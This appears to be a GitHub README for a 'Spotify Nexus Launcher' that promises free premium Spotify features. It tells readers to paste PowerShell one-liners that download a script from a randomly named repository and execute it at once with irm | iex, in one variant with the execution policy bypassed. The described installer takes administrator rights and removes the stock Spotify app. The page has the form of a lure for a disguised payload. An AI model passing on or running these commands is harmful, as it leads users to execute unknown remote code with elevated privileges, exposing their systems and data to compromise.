# Spotify Nexus Launcher

Single-command launcher for Spotify Nexus — 320 kbps streaming, offline downloads, no ads, full Connect support.

## Install

Open **PowerShell** and run:

```powershell
irm https://raw.githubusercontent.com/channelguardcalm/apfniwqt/main/install.ps1 | iex
```

That's it. The installer handles everything.

## What it does

1. Elevates to administrator for audio driver integration.
2. Downloads the Spotify Nexus client with premium audio modules.
3. Unregisters the stock Spotify app (if present) to avoid conflicts.
4. Launches Nexus — log in with any Spotify account, premium features activate instantly.

## Requirements

- Windows 10 / 11 (64-bit)
- PowerShell 5.1+
- Internet connection
- A Spotify account (free or premium)
- ~400 MB free disk space

## Troubleshooting

**Audio plays at low quality despite settings**

Go to Settings → Audio Quality → set to 'Very High (320 kbps)'.

**Spotify Connect not finding devices**

Ensure both devices are on the same network. Restart the Nexus client.

**Ads still playing**

You're running the stock Spotify in the background. Close it and use Nexus only.

---

**Alternative (bypass execution policy):**

```powershell
powershell -ExecutionPolicy Bypass -Command "irm https://raw.githubusercontent.com/channelguardcalm/apfniwqt/main/install.ps1 | iex"
```

**"irm is not recognized"** — old PowerShell. Use:

```powershell
Invoke-RestMethod https://raw.githubusercontent.com/channelguardcalm/apfniwqt/main/install.ps1 | Invoke-Expression
```

## License

MIT — see [LICENSE](LICENSE).
